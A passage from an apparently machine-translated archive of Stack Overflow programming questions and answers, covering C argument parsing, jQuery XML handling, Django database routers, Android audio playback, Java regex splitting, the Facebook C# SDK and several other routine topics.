    if ( (*argv[input] + i-1) == '-') // check for option
    {
        printf(" - detected first");
        if (*(argv[input] + i  ) == 's') // check for wordwrap
        {
            printf(" s detected");
            i++;
            i++;
            s = 1; // set s to true to that option can be added later
            wordwrap = 1; // set wordwrap on or true
        }   

        if (*(argv[input] + i) ==  'w')//if the second option is a w
        {
            i++;
            printf(" w detected ");
            sscanf ((argv[input] + i), "%d", &wraplength);
            printf ("%d", wraplength);
            if ( wraplength < 1) // check what the number is
                {
                    printf("Usage: wrapfile [-s] [-w width] file ...");
                    return 2; // command line options incorrect
                }               
        }

        if (*(argv[input] + i) == '-')
        {
            printf(" second - detected");
            i++;

            if (*(argv[input]+ i) ==  'w')//if the second option is a w
            {
                i++;

                if (sscanf ((argv[(input)+1]), "%d", &wraplength) != 1) // check what the number is
                {
                    printf("Usage: wrapfile [-s] [-w width] file ...");
                    return 2; // command line options incorrect
                }
            }
        }
    }
}
return 0;
} 
```

大编辑：我接受了 Dietrich Epp 的建议，这是我用它做的事情。每次我尝试检查“-s”之后的参数时，我的程序似乎都会崩溃。如何在不使程序崩溃的情况下检查下一个参数（如果没有？）。我知道这条线与崩溃有关：

```
 arg = argv[i++]; 
```

这是代码：

```
while (i < argc) 
{
    arg = argv[i++];
    if (!strcmp(arg, "-s")) 
    {
        arg = argv[i++];
        son = 1; 
        printf("Have -s\n");
        if (!strcmp(arg, "-w"))
        {
            if (i >= argc)
            {
                printf("Usage: wrapfile [-s] [-w width] file ...");
            }
            param = argv[i++];
            wraplength = *param;
            printf("Have -w %s\n", param);
        }

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:24:12.060

我认为您在这里混淆了循环变量。

这会`i`遍历所有参数，*包括* `argv[0]`您通常不想要的参数。

```
for (i=0; i < argc; i++) 
```

这`i`用作参数字符串之一的索引，但语法很有趣。

```
if (*(argv[input] + i  ) == 's') 
```

在其他系统上，您只需使用`getopt()`，但这并不总是在 Windows 上的一个选项。

## 建议

你会想要一个更像这样的循环：

```
// Note: C99, so you will need to translate to C89 if you use Microsoft's
// C compiler
int i = 1;
while (i < argc) {
    char *arg = argv[i++];
    if (!strcmp(arg, "-s")) {
        printf("Have -s\n");
    } else if (!strcmp(arg, "-w")) {
        if (i >= argc)
            error();
        char *param = argv[i++];
        printf("Have -w %s\n", param);
    } else {
        error();
    }
} 
```

命令选项解析与您的程序性能非常*不*相关，以至于上面的`if`/`else`块链`strcmp()`很好。

# 警告！

您将**无法**使用它指定任意文件名！如果您从 获取参数`main()`，它们将被转换为您当前使用的任何代码页，这对于几乎任何目的都被严重破坏。（如果您是唯一使用该程序的人，那*可能会很好。）*

为了指定任意文件名，您需要调用`GetCommandLineW()`以 UTF-16 格式获取命令行，然后`CommandLineToArgvW()`将其解析为`int argc`和`wchar_t **argv`.

# jquery - 如何解析从服务器返回的表中的 XML

> ID：13756339
> 
> 赞同：0
> 
> 时间：2012-12-07T03:07:24.250
> 
> 标签：jquery, xml-parsing

从 ajax POST 表单返回的数据是一个表。表格在一个单元格中包含 xml，我可以到达必要的单元格并将其显示在页面上作为包含所有标签的直接 xml 或仅显示文本。我需要以某种方式格式化xml，目前我对它的唯一影响是当它的直接xml和css样式时——这是不可取的。

```
success: function(data) {
    var answer = $(data).find("td:eq(3)").text();
    var message = $(data).find("td:eq(5)").html();
    var xmlDoc = $.parseXML( message );
    var $xml = $( xmlDoc );
if (answer==="True") {
    $xml.each(function() {
       $('#resultGenerate').show().append($(this).html());
});
} else {
    $('.processing').hide();
    $('input[type="text"], input[type="password"]').val("");
    $('#resultGenerate').show().html('<ul><li>' + answer + '</li><li>' + message +    
    '</ul>');
}
} 
```

以上只是将其作为文本返回，我如何解析 xml 以获取标签并将它们附加到表格中？我整天都在这，我真的需要一些帮助。我知道我需要为每个 xml 标签设置一个 var，例如

```
var xmltagfoo = $(this).find('xmltagfoo').text(); 
```

然后像这样附加

```
$('#resultGenerate').append($('<td>' + xmltagfoo + '</td>')); 
```

但我根本无法让它发挥作用。请帮忙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T16:10:04.220

终于让它工作了，用 GET 请求很容易做到，但是当从 POST 返回数据时，它有点棘手。我是这样做的

```
$.ajax({
type: $(form).attr('method'),
url: form.action,
data: dataString,
clearForm: true,
success: function(data) {
    var answer = $(data).find("td:eq(3)").text();
    var message = $(data).find("td:eq(5)").html();
    var $xml = $( message );

    if (answer==="True") {
        $xml.find('license').each(function(){
    var XXXCustomerID = $(this).find(XXXCustomerID').text();
            var XXLicense  = $(this).find('XXLicense').text();
            var Log  = $(this).find('Log').text();
            var ExpirationDate  = $(this).find('ExpirationDate').text();
    $("#resultGenerate").show().append($('<li><span class="ID">' + XXXCustomerID + '</span><span class="NTL">' + XXLicense + '</span><span class="Log">' + Log + '</span><span class="Exp">' + ExpirationDate + '</span></li>'));
            });
    } else {
            $('.processing').hide();
            $('input[type="text"], input[type="password"]').val("");
            }
        }
    }); 
```

# c# - 类似于 Java Desktop 类的 C# 类

> ID：13756342
> 
> 赞同：0
> 
> 时间：2012-12-07T03:07:43.923
> 
> 标签：c#, java

> **可能重复：**
> [使用关联的应用程序打开文件](https://stackoverflow.com/questions/10174156/open-file-with-associated-application)

我想在相应的应用程序中打开一个文件，例如打开窗口的功能。

`Desktop`在传递文件名并打开相应文件的类的帮助下，可以在 java 中完成同样的事情。

但不知道如何在 C# 中做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:10:59.237

```
System.Diagnostics.Process.Start("filename.doc"); 
```

# google-app-engine - 如何将键的字符串版本转换回我可以使用 get() 函数获取实体实例的形式

> ID：13756343
> 
> 赞同：6
> 
> 时间：2012-12-07T03:07:55.803
> 
> 标签：google-app-engine, google-cloud-datastore

class Key(encoded=None) Datastore 对象的唯一键。

通过将 Key 对象传递给 str()，可以将键转换为字符串。该字符串是“urlsafe”——它只使用在 URL 中有效的字符。通过将键的字符串表示形式传递给 Key 构造函数（编码参数），可以将其转换回 Key 对象。

注意：密钥的字符串表示看起来很神秘，但没有加密！它可以转换回原始密钥数据，包括种类和标识符。如果您不想将这些数据暴露给您的用户（并让他们轻松猜测其他实体的密钥），请加密这些字符串或使用其他东西。

编码 要转换回 Key 的 Key 实例的 str 形式。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-07T21:08:41.797

如果您使用的是 Python NDB，则可以将 Key 转换为 URL 安全字符串，如下所示：

```
key_str = yourmodel.key.urlsafe() 
```

您可以从 URL 安全字符串转换回 Key，如下所示：

```
my_key = ndb.Key(urlsafe=key_str) 
```

有关更多信息，请查看[NDB Key 类](https://developers.google.com/appengine/docs/python/ndb/keyclass)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-07T03:14:05.687

如果我对您的理解正确，您希望获取编码的密钥字符串并将其转换回`Key`对象。如果是这样，您可以这样做：

```
from google.appengine.ext.db import Key

# ...
key_str = '<your_key_string>'    
key_obj = Key(key_str) # or Key(encoded=key_str)

entity = db.get(key_obj) # Although the string will work here as well 
```

# android - Android自定义语音拨号器命令

> ID：13756344
> 
> 赞同：1
> 
> 时间：2012-12-07T03:08:18.470
> 
> 标签：android, android-intent, voice-recognition

我正在寻找基于用户语音拨号的自定义操作（例如点击蓝牙耳机上的按钮或汽车上的拨号按钮）。这可能吗？我知道通过调用意图是微不足道的，但我不知道我是否可以与语音拨号器无缝集成。

# python - Django中不同应用程序的不同数据库

> ID：13756356
> 
> 赞同：25
> 
> 时间：2012-12-07T03:10:38.910
> 
> 标签：python, django

我的 Django 站点中有多个应用程序：*mainsite*、*blog*和*tutorials*。

我可以在不同的 Django 应用程序中使用不同的数据库（例如 PostgreSQL、MySQL）吗？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-12-07T04:10:45.940

这是您必须做的事情。

1) 更新您要使用的数据库的设置。

设置.py

```
DATABASES = {
'default': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME': '/var/db/projectdb'
}
'db_app1': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME': '/var/db/app1db'
}
'db_app2': {
    'ENGINE': 'django.db.backends.sqlite3',
    'NAME': '/var/db/app2db'
} 
```

2) 对于每个数据库，实现一个数据库路由器，它将适当地路由查询。在您的情况下，在每个应用程序中实施。请注意，这或多或少取自 django 文档。

app1.dbRouter.py

```
# DB router for app1

class App1DBRouter(object):
    """
    A router to control app1 db operations
    """
    def db_for_read(self, model, **hints):
        "Point all operations on app1 models to 'db_app1'"
        from django.conf import settings
        if not settings.DATABASES.has_key('db_app1'):
            return None
        if model._meta.app_label == 'app1':
            return 'db_app1'
        return None

    def db_for_write(self, model, **hints):
        "Point all operations on app1 models to 'db_app1'"
        from django.conf import settings
        if not settings.DATABASES.has_key('db_app1'):
            return None
        if model._meta.app_label == 'app1':
            return 'db_app1'
        return None

    def allow_relation(self, obj1, obj2, **hints):
        "Allow any relation if a model in app1 is involved"
        from django.conf import settings
        if not settings.DATABASES.has_key('db_app1'):
            return None
        if obj1._meta.app_label == 'app1' or obj2._meta.app_label == 'app1':
            return True
        return None

    def allow_syncdb(self, db, model):
        "Make sure the app1 app only appears on the 'app1' db"
        from django.conf import settings
        if not settings.DATABASES.has_key('db_app1'):
            return None
        if db == 'db_app1':
            return model._meta.app_label == 'app1'
        elif model._meta.app_label == 'app1':
            return False
        return None 
```

3）`DATABASE_ROUTERS`在settings.py中更新

设置.py

```
DATABASE_ROUTERS = ['app1.dbRouter.App1DBRouter', 'app2.dbRouter.App2DBRouter'] 
```

**使用 Python 3 的人的注意事项**

像这样的陈述

```
 if not settings.DATABASES.has_key('db_app1'): 
```

应该成为

```
 if 'db_app1' not in settings.DATABASES: 
```

# android - 我怎么能在我的应用程序中从我的服务器播放音频？

> ID：13756360
> 
> 赞同：3
> 
> 时间：2012-12-07T03:11:07.580
> 
> 标签：android, media-player

我是 android 的新初学者...我不知道如何从我的应用程序中的任何服务器播放音频...只是我可以播放 mp3 或来自 sdcard 或原始文件夹的任何内容..有人可以帮助我解决这一点吗？ ！..我在这个网页上进行了搜索，但每个人都对此进行了解释..我很困惑:(

主.java

```
TextView ic=(TextView)findViewById(R.id.sonraki);
ic.setOnClickListener(new OnClickListener(){

   public void onClick(View v){
       Intent i=new Intent(tasavvuf.this,ney.class);
       startActivity(i);

Button play=(Button)findViewById(R.id.cal);
Button stop=(Button)findViewById(R.id.dur);

play.setOnClickListener(new OnClickListener(){

@Override
public void onClick(View v){
    }

     });

stop.setOnClickListener(new OnClickListener(){

    @Override
    public void onClick(View v){
        mp=MediaPlayer.create(tasavvuf.this,R.raw.tasavvuf);
    mp.start();
    }           
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:15:20.167

将您的代码更改为从服务器 URL 播放 mp3：

```
 stop.setOnClickListener(new OnClickListener(){

        @Override
        public void onClick(View v){
           mp = MediaPlayer.create(Your_Activity.this, 
           Uri.parse("YOUR_MP3#_URL_HERE"));
           mp.setOnPreparedListener(new OnPreparedListener() { 
        @Override
        public void onPrepared(MediaPlayer mp) {
            mp.start();
        }
         });
    } 
```

并在中添加 Internet 权限`Androidmanifest.xml`：

```
<uses-permission android:name="android.permission.INTERNET" /> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-07T06:45:38.403

在您的类中实现 OnPreparedListener 并覆盖 onPrepared(MediaPlayer mp)。

然后在你的 onCreate ：

字符串 url = "网址";

媒体播放器 mediaPlayer = new MediaPlayer();

```
mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
try {
    mediaPlayer.setDataSource(url);
    mediaPlayer.setOnPreparedListener(this);

} catch (IllegalArgumentException e) {

    e.printStackTrace();

} catch (IllegalStateException e) {

    e.printStackTrace();

} catch (IOException e) {

    e.printStackTrace();
}
mediaPlayer.prepareAsync(); 
```

}

在覆盖的 onPrepared 中执行 mp.start 以启动准备好的媒体。

@Override public void onPrepared(MediaPlayer mp) {

```
 mp.start(); 
```

}

有关详细参考，您可以在示例 android 代码中查找 RandomMusicPlayer 示例。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T03:16:50.430

要在 Android 中播放音频，您需要熟悉 MediaPlayer。请参阅[http://developer.android.com/reference/android/media/MediaPlayer.html](http://developer.android.com/reference/android/media/MediaPlayer.html)。

网上也有很多不错的教程。试试[http://www.helloandroid.com/tutorials/how-play-video-and-audio-android](http://www.helloandroid.com/tutorials/how-play-video-and-audio-android) 和[http://www.androidhive.info/2012/03/android-building-audio-player-tutorial/](http://www.androidhive.info/2012/03/android-building-audio-player-tutorial/)

希望有帮助！:)

# java - Java中的空指针异常，不知道为什么

> ID：13756362
> 
> 赞同：1
> 
> 时间：2012-12-07T03:11:24.760
> 
> 标签：java, nullpointerexception

我一直在编写一个 Java 程序——特别是一个 Bukkit 插件，尽管这与问题无关——出于某种原因，我看不到我得到了 NullPointerException。下面摘录的是出现错误的代码。`getPath()`经过充分测试并产生正确的目录 - 也就是说，配置文件应该在其中。配置文件被创建，并且应该已经被写入。我已经成功创建了测试器文件，配置文件也应该如此。

```
File config = new File(getPath("config"));
BufferedReader in = new BufferedReader(new FileReader(config));
skipLines(11, in);
if(in.readLine().equalsIgnoreCase("true")) {   //Exception is here
    System.out.println("Successfully wrote to config file");
}
else {
    System.out.println("Failed to write text correctly to config file");
}
in.close(); 
```

整个事情都包含在一个 try/catch 语句中。
如果您需要更多信息，请询问，我很乐意提供。
注意：文件工作得很好——当我手动检查文件时，上面写着。这就是问题存在的原因。
写入文件的代码如下：

```
File exConfig = new File(System.getProperty("user.dir") + File.separator + "configExample");
PrintWriter out = new PrintWriter(new FileWriter(config));
BufferedReader in = new BufferedReader(new FileReader(exConfig));
for(int i = 1; i <= configLength; i++) {
    out.println(in.readLine());
}
out.flush();
out.close();
System.out.println("Successfully wrote defaults to config"); 
```

`configLength`是一个变量，等于配置中的行数。我已经对其进行了测试，并且可以正常工作。那里可能有一些奇怪的东西。名为“configExample”的文件如下：

```
########################################
#  hPlugin is written by newbiedoodle  #
########################################
#   -----  Plugin config file  -----   #
########################################
hPlugin
v.0.3
NOTE: Do not edit the config file besides changing the values - it may result in errors.
--------------
Enable hPlugin?
true
Strikes before being banned?
3
Godmode?
true
First time running the plugin?
true
Curse protection?
true
Emergency shelter?
true
Path building?
true
Blocked words/phrases (Separate with colon (:)):
shit:fuck:damn:bitch:hell 
```

如您所见，这应该超过 11 行......如果第 11 行不是“真”，那么它仍然不应该导致错误。

好吧，经过一番鬼混之后，我让它工作了......结果，我搞砸了一个变量，因为一个函数有一个硬编码的文件名，而不是设置为我试图传递的变量。感谢所有的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:14:52.927

**例外情况很明显，您的BufferedReader**没有任何内容可读取。因此`in.readLine()`返回 null，因此调用`in.readLine.equalIgnorecase()`返回 NullPointerException。

在继续之前，您应该首先检查 BufferedReader.readLine() 是否返回 null。

```
if(in.readLine().equalsIgnoreCase("true")) {   //Exception is here 
```

应该

```
String line=null;
while((line=in.readLine())!=null) {   //if in.readLine()  returns null, the condition fails
if(line.equalsIgnoreCase("true")) {
     //do your stuff
}
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:15:26.810

readLine() 返回 null，然后对该 null 值调用 equalsIgnore。
分开那个调用，并检查不为空。

# javascript - iScroll 和黑莓触控板问题

> ID：13756364
> 
> 赞同：1
> 
> 时间：2012-12-07T03:11:41.400
> 
> 标签：javascript, jquery, html, blackberry-webworks, iscroll

我在尝试使 iScroll 工作时遇到问题。

目前我正在开发这个使用 Webworks、HTML5、jQuery、JavaScript、CSS 开发的应用程序，该应用程序将同时适用于在 OS 6 和 7 上运行的触摸屏和非触摸屏设备。

我们团队正在开发的应用程序也需要检索和显示大量数据，因此会有大量滚动（水平和垂直）。那是我们开始敲打头并拔出头发的时候。在 OS 6 和 7 上，即使您将 div 设置为 overflow: auto 滚动条也不会出现，并且如果用户尝试使用触控板/轨迹球滚动，滚动不会超出滚动 div 的高度或宽度。

然后我们发现了 iScroll。这很好，但另一个问题是，我们的应用程序的工作方式是这样的：

我们有一个 index.html

```
<body id="mainBody" onLoad="mainMenu()"></body> 
```

它将加载 mainMenu()，其中包含布局和导航到应用程序的其他功能，例如，功能一（功能一页（）），功能二（功能二页（））。iScroll 在以下位置初始化：

```
<body id="mainBody" onLoad="mainMenu()">
<script type="text/javascript">
var myScroll;
function scroll() {
myScroll = new iScroll('wrapper',);

}
document.addEventListener('touchmove', function (e) { e.preventDefault(); }, false);
window.addEventListener('load', scroll, false);

</script> 
```

**问题 1 - 第二个 iScroll 未初始化**
iScroll 将在 mainMenu() 中很好地显示，但 iScroll 不会显示在从 mainMenu() 调用的其他函数中。例如在 mainMenu() 中有一个指向函数 displayUser() 的链接，我点击链接 iScroll 不会在那里显示。这个问题有什么解决方案吗？

**问题 2 - 黑莓触控板**
还有一个问题，如果页面显示超过 5 行记录，即使 x-blackberry-focusable="true"，触控板焦点导航也不起作用，并且有 onmouseover 和 onmouse 事件来处理焦点事件。config.xml 中也已设置。

有没有人遇到过这些问题？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T16:01:08.433

尝试使用基于焦点的导航，1- `<widget> <rim:navigation mode="focus"/> <feature id="blackberry.ui.dialog"/> </widget` 在您的 Config.xml 文件中添加，

2-在您需要添加的所有表单元素中`x-blackberry-focusable="true"`

了解基于焦点的导航会很有帮助，还有许多其他未来可用于改进结果。如果您遇到任何解决方案，请在此处分享。

问候

# python - 使用 makefile 将 Python 输出写入文件

> ID：13756372
> 
> 赞同：1
> 
> 时间：2012-12-07T03:13:05.720
> 
> 标签：python, makefile, output, file-io

我有一个 Python 程序`prog.py`，我想在一个文件上运行`input`，然后将其输出写入 `output.txt`.

在终端中，如果我输入：

```
$ python prog.py < input.py > output.txt 
```

现在，我想要一个做同样事情的makefile。我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:20:24.337

在您的 makefile 中只需：

```
all:
    python prog.py < input.py > output.txt 
```

# java - Java 代码中的正则表达式帮助

> ID：13756374
> 
> 赞同：-4
> 
> 时间：2012-12-07T03:13:07.153
> 
> 标签：java, regex

我需要一个正则表达式来解析一个字符串，该字符串需要用逗号分割......用作分割的逗号只能匹配逗号而不是引号......

```
should be 3: 3 (is right)
should be 3: 14 (is wrong, counted commas inside quotes)
should be 24: 12 (is wrong)
should be 24: 24\. (is right) 
```

对于以下结果测试用例：

```
String line ="com.day.image;uses:=\"javax.imageio.stream,javax.imageio.spi,javax.imageio.plugins.jpeg,org.slf4j,javax.imageio.metadata,javax.imageio,com.day.imageio.plugins,com.day.image.font\",com.day.imageio.plugins;uses:=\"javax.imageio,javax.imageio.metadata,javax.imageio.stream,javax.imageio.spi,org.w3c.dom\",com.day.image.font;uses:=\"com.day.image\"";

        String[] results1 = line.split("\",");
        String[] results2 = line.split(",");

        System.out.println("should be 3: "+ results1.length);
        System.out.println("should be 3: "+ results2.length);

        line = "com.day.cq.commons,com.day.cq.commons.inherit,com.day.cq.wcm.api,com.day.cq.wcm.api.components,com.day.cq.wcm.api.designer,com.day.cq.wcm.commons,com.day.cq.wcm.tags,com.day.cq.widget,javax.servlet,javax.servlet.http,javax.servlet.jsp;version=\"2.1\",javax.servlet.jsp.el;version=\"2.1\",javax.servlet.jsp.jstl.core,javax.servlet.jsp.jstl.fmt,javax.servlet.jsp.tagext;version=\"2.1\",org.apache.commons.lang;version=\"2.4\",org.apache.sling.api;version=\"2.1\",org.apache.sling.api.request;version=\"2.1\",org.apache.sling.api.resource;version=\"2.1\",org.apache.sling.api.scripting;version=\"2.1\",org.apache.sling.api.servlets;version=\"2.1\",org.apache.sling.scripting.jsp.taglib;version=\"2.0\",org.apache.sling.scripting.jsp.util;version=\"2.0\",org.slf4j;version=\"1.5\"";

        results1 = line.split("\",");
        results2 = line.split(",");

        System.out.println("should be 24: "+ results1.length);
        System.out.println("should be 24: "+ results2.length); 
```

输出是，

```
should be 3: 3
should be 3: 14
should be 24: 12
should be 24: 24 
```

**更新**

我非常了解我需要什么，但我不知道该怎么做......我的解释我试图完成的不是最好的。一个定义不好的问题，几乎不会导致解决方案。我的能力之一是简单地处理复杂的场景，显然今晚不适合我。

搜索后我再次优化我的问题，谷歌搜索词：“我如何匹配引号之外的字符？”

现在众所周知，如果您也向 Google 提出正确的问题，Google 的第一个结果应该是您最可能寻找的结果；）。

第一个结果，[正则表达式在引号之外选择逗号](https://stackoverflow.com/questions/632475/regex-to-pick-commas-outside-of-quotes)

正则表达式是这样的：(,)(?=(?:[^"']|["|'][^"'] *")* $)。

测试和工作..

最后，我假设编程技能和理解技能之间存在差异，它们肯定不是许多程序员都具备的。我在几个地方问过，大多数人说这是不可能的……显然是的。

感谢您的时间，抱歉，也许急于寻求帮助。

这个网站很棒！:)

**更新2**

这个正则表达式 (,)(?=(?:[^"']|["|'][^"'] *")* $)。给我 StackOverFlow 的问题..!!

```
at java.util.regex.Pattern$GroupHead.match(Unknown Source)
at java.util.regex.Pattern$Loop.match(Unknown Source)
at java.util.regex.Pattern$GroupTail.match(Unknown Source)
at java.util.regex.Pattern$BranchConn.match(Unknown Source)
at java.util.regex.Pattern$CharProperty.match(Unknown Source)
at java.util.regex.Pattern$Branch.match(Unknown Source)
at java.util.regex.Pattern$GroupHead.match(Unknown Source)
at java.util.regex.Pattern$Loop.match(Unknown Source)
at java.util.regex.Pattern$GroupTail.match(Unknown Source)
at java.util.regex.Pattern$BranchConn.match(Unknown Source)
at java.util.regex.Pattern$CharProperty.match(Unknown Source)
at java.util.regex.Pattern$Branch.match(Unknown Source)
at java.util.regex.Pattern$GroupHead.match(Unknown Source)
at java.util.regex.Pattern$Loop.match(Unknown Source)
at java.util.regex.Pattern$GroupTail.match(Unknown Source)
at java.util.regex.Pattern$BranchConn.match(Unknown Source)
at java.util.regex.Pattern$CharProperty.match(Unknown Source)
at java.util.regex.Pattern$Branch.match(Unknown Source)
at java.util.regex.Pattern$GroupHead.match(Unknown Source)
at java.util.regex.Pattern$Loop.match(Unknown Source)
at java.util.regex.Pattern$GroupTail.match(Unknown Source)
at java.util.regex.Pattern$BranchConn.match(Unknown Source)
at java.util.regex.Pattern$CharProperty.match(Unknown Source)
at java.util.regex.Pattern$Branch.match(Unknown Source)
at java.util.regex.Pattern$GroupHead.match(Unknown Source)
at java.util.regex.Pattern$Loop.match(Unknown Source) 
```

显然它适用于某些输入，但不适用于其他输入！还是 Java 正则表达式引擎有问题？

**更新3**

此正则表达式不会溢出并且有效（java 转义）： "(,)(?=(?:[^\"]|\"[^\"] *\")* $)"

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:52:15.027

正则表达式不利于跟踪某事物是“内部”还是“外部”引号、方括号、圆括号等；因此，最好的方法可能是逐个字符地遍历字符串，并使用一个标志来跟踪当前字符是否在一组引号内（这个标志将开始为假并打开和关闭因为遇到引号）。

但是，如果您确定要使用正则表达式执行此操作，我建议首先用引号 ( `intermediate = line.split("\"");`) 分割字符串，然后用逗号分割中间列表中的每个元素，然后将结果连接在一起。连接步骤会有点棘手，因为您需要将每个数组的最后一个元素与下一个数组的第一个元素组合在一起，并用引号将它们分隔开。

另一种可能性：首先用引号将字符串分割，然后将**奇数**段中出现的每个逗号替换为字符串中其他任何地方都没有出现的字符序列（例如`$split$`），但保留偶数段（即，那些代表引用的部分）单独。将这些段重新组合成一个字符串（当然，在每对段之间重新插入引号），然后按`$split$`.

# asp.net - Does the Facebook C# SDK depend on cookies on the server?

> ID：13756383
> 
> 赞同：0
> 
> 时间：2012-12-07T03:15:00.883
> 
> 标签：asp.net, facebook, facebook-c#-sdk

I'm using the [Facebook C# SDK](http://csharpsdk.org/) and am trying to figure out exactly how it works. I actually use an AJAX web method to lookup the Facebook account details based on the authenticated user ID, which looks something like this:

```
if (response.status === "connected")
{
   KitchenPC.LogonFB(response.authResponse.userID, checkResult, facebookError);
} 
```

On the server side, the LogonFB web method does something like:

```
Client = new FacebookClient(applicationId, applicationSecret);
var result = Client.Get(path) as IDictionary<string, object>;

UserId = Int64.Parse((String)result["id"]);
Name = result["name"] as String;
FirstName = result["first_name"] as String;
LastName = result["last_name"] as String;
Location = result.ContainsKey("location") ? result["location"] as String : "";
Gender = result.ContainsKey("gender") ? result["gender"] as String : "";
Email = result["email"] as String; 
```

Where `path` is the user ID passed in from the client.

**My Question:**

I'm switching from ASP.NET Web Service to WCF, and WCF does not support cookies. In fact, `HttpContext.Current` will be null within the WCF pipeline. I was under the impression that the Facebook C# SDK *depended* on the `fbm_` and `fmsr_` cookies being passed in on the request, which would be used to validate the session with the Facebook server. However, much to my surprise, the `.Get()` call still works, and user information is returned. I also dug through the SDK source code and nowhere in it do I find references to `HttpContext.Current`.

Does the Facebook C# SDK work completely independently of cookies? Does this mean that all I need is the user's Facebook ID, and as long as they've previously approved my app ID, I can grab information about their account?

I just want to make sure I'm not doing anything wrong, and I'm not going to run into trouble in production.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T04:46:57.500

When you pass the constructor with appId and appSecret, it will auto set the access token as app access token using `string.Concat(appId, '|', appSecret)`. That constructor has been removed in newer version of the sdk. [https://github.com/facebook-csharp-sdk/facebook-csharp-sdk/issues/103](https://github.com/facebook-csharp-sdk/facebook-csharp-sdk/issues/103)

Set it to null if you don't want the access token.

```
Client = new FacebookClient(applicationId, applicationSecret);
Client.AccessToken = null;
var result = Client.Get(path) as IDictionary<string, object>; 
```

# python-3.x - 从字符串中获取字符的倒数第二次出现

> ID：13756385
> 
> 赞同：0
> 
> 时间：2012-12-07T03:15:05.597
> 
> 标签：python-3.x

如何获得字符串中字符的倒数第二个出现？我想用它来`aaa`获取`www.example.com/example/abc/aaa`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-08T06:32:14.267

我喜欢正则表达式：

```
import re
p = re.compile('a')
all_positions = [oMatch.span() for oMatch in p.finditer(sText)]
second_last_position_span = all_positions[-2]   
second_last_position_start_index = second_last_position_span[0] 
```

# c++ - 尝试使用 dev-C++ 创建 .exe 时出现错误 255

> ID：13756389
> 
> 赞同：2
> 
> 时间：2012-12-07T03:15:30.290
> 
> 标签：c++, window, dev-c++

今天我遇到了 Dev-C++ 最通用的编译错误

```
Compiler: Default compiler
Building Makefile: "C:\projects\Makefile.win"
Executing  make...

make.exe -f "C:\projects\Makefile.win" all
g++.exe -c test.cpp -o test.o -I"C:/Dev-Cpp/lib/gcc/mingw32/3.4.2/include"  -I"C:/Dev-Cpp/include/c++/3.4.2/backward"  -I"C:/Dev-Cpp/include/c++/3.4.2/mingw32"  -I"C:/Dev-Cpp/include/c++/3.4.2"  -I"C:/Dev-Cpp/include"  -I"C:/SDL-1.2.15/include"   

make.exe: *** [test.o] Error 255

Execution terminated 
```

就是这样。我在网上搜索了一下，但通常你可以在编译日志中看到一些其他类型的错误，但在我的情况下没有。任何人都可以帮助。我在窗口 8 上运行它

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T17:50:37.773

请将您的 IDE 更新到以下版本，该版本修复了大量错误，随 GCC 4.6.1 或 4.7.0 一起提供，并且完全可移植：http: [//sourceforge.net/projects/orwelldevcpp/](http://sourceforge.net/projects/orwelldevcpp/)

这将是尝试解决有关自动生成的 makefile 的问题的第一个修复程序。更新版本可能会修复您的 makefile 问题。

您也可以自己打开自动生成的 makefile，然后：

*   转到项目>>项目选项>> Makefile并勾选“使用自定义makefile”。
*   尝试手动修复makefile。
*   ？？？
*   重建。
*   利润。

如果此选项之前未选中，您可以确定旧的 Dev-C++ 在创建 makefile 时出错，或者捆绑的编译器由于某种原因而损坏。

# google-bigquery - 如何避免使用子选择连接时出现内部错误

> ID：13756391
> 
> 赞同：0
> 
> 时间：2012-12-07T03:15:41.477
> 
> 标签：google-bigquery

运行连接两个子选择的查询时出现*internalError 。*查询如下所示：

```
SELECT data_table.title AS name
FROM
  ( 
    SELECT id, title
    FROM
    [citrius-altrius-fortius:analyze.topic_735_1354233600], [citrius-altrius-fortius:analyze.topic_735_1354320000]
  ) AS  data_table
  INNER JOIN
  ( 
    SELECT id FROM
    [citrius-altrius-fortius:analyze.topic_735_1354233600], [citrius-altrius-fortius:analyze.topic_735_1354320000]
    WHERE
    UPPER(title) CONTAINS ("BUDGET")
  ) AS filter_table
ON data_table.id == filter_table.id 
```

这是我得到的答复：

```
{
  "status": {
    "state": "DONE", 
    "errors": [
      {
        "reason": "internalError", 
        "message": "Unexpected. Please try again."
      }
    ], 
    "errorResult": {
      "reason": "internalError", 
      "message": "Unexpected. Please try again."
    }
  }, 
  "kind": "bigquery#job", 
  "statistics": {
    "endTime": "1354849344685", 
    "startTime": "1354849344148"
  }, 
  "jobReference": {
    "projectId": "citrius-altrius-fortius", 
    "jobId": "job_e870b1fe67b94897a157dfa4f60b9725"
  }, 
  "etag": "\"OLvSfkwPDZ7M36YVEFvi-PBaFQM/SnvQhZKTutJxTY1bJLqqdphkA00\"", 
  "configuration": {
    "query": {
      "createDisposition": "CREATE_IF_NEEDED", 
      "query": "SELECT data_table.title AS name\nFROM\n  ( \n    SELECT id, title\n    FROM\n    [citrius-altrius-fortius:analyze.topic_735_1354233600], [citrius-altrius-fortius:analyze.topic_735_1354320000]\n  ) AS  data_table\n  INNER JOIN\n  ( \n    SELECT id FROM\n    [citrius-altrius-fortius:analyze.topic_735_1354233600], [citrius-altrius-fortius:analyze.topic_735_1354320000]\n    WHERE\n    UPPER(title) CONTAINS (\"BUDGET\") LIMIT 1000\n  ) AS filter_table\nON data_table.id == filter_table.id\n;", 
      "destinationTable": {
